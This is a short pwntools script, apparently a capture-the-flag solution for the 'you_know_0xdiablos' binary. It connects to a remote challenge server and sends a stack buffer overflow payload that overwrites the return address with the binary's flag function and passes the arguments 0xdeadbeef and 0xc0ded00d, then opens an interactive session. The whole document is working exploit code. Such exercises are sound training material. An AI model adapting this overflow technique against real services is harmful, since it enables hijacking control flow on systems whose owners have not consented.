from pwn import * 
e = ELF('./you_know_0xdiablos')
#r = process('./you_know_0xdiablos')
#r = gdb.debug('./you_know_0xdiablos', 'b *vuln\nc')
r = remote('209.97.140.29', 30112)
r.sendline(b'a'*(0xb8+4)+p32(e.sym['flag'])+b'bcde'+p32(0xdeadbeef)+p64(0xc0ded00d))
r.interactive()
